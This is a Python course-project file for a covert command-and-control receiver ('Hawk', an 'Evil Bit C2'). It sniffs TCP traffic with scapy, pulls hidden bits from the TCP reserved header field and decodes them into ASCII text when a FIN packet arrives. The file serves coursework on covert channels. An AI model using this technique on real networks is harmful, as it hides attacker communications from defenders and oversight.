# Hawk
# Author: Jason Howe
# CSEC 750
# Evil Bit C2

# server.py
# C2 Server for Hawk

from scapy.all import sniff, TCP
from textwrap import wrap
# TODO implement server side

MSG_RAW = [""]
packet_counter = 0

def split_string_into_chunks(input_string, chunk_size=6):
    for i in range(0, len(input_string), chunk_size):
        yield input_string[i:i+chunk_size]

def binary_to_ascii(binary_string):
    # Convert binary string to integer
    decimal_value = int(binary_string, 2)

    # Convert integer to ASCII character
    ascii_character = chr(decimal_value)

    return ascii_character


def parse(input):
    #chunks = list(split_string_into_chunks(input))
    chunks = wrap(input, 6)
    msg = []
    for i in chunks:
        msg.append("01" + i)
    string = []
    for i in msg:
        string.append(binary_to_ascii(i))
    final = ''.join(string)

    print(final)


def convert(input):
    if input == 0:
        return "000"
    elif input == 1:
        return "001"
    elif input == 2:
        return "010"
    elif input == 3:
        return "011"
    elif input == 4:
        return "100"
    elif input == 5:
        return "101"
    elif input == 6:
        return "110"
    elif input == 7:
        return "111"

def handle_packet(packet):
    global MSG_RAW
    global packet_counter
    packet_counter += 1
    if packet_counter % 2 == 1:
        # if TCP in packet and packet[TCP].dport == 9999:
        if TCP in packet:
            # Process the packet
            if packet[TCP].flags == "F":
                #print("F", MSG_RAW)
                parse(MSG_RAW[0])
            #print(f"Received TCP packet on port 9999: {packet.summary()}")
            #print("msg", packet[TCP].reserved)
            #print("str", convert(packet[TCP].reserved))
            MSG_RAW[0] += convert(packet[TCP].reserved)
        


def main():
    # sniff(filter="tcp and port 9999", prn=handle_packet, iface="lo0", store=0)
    sniff(filter="tcp", prn=handle_packet, iface="lo", store=0)


main()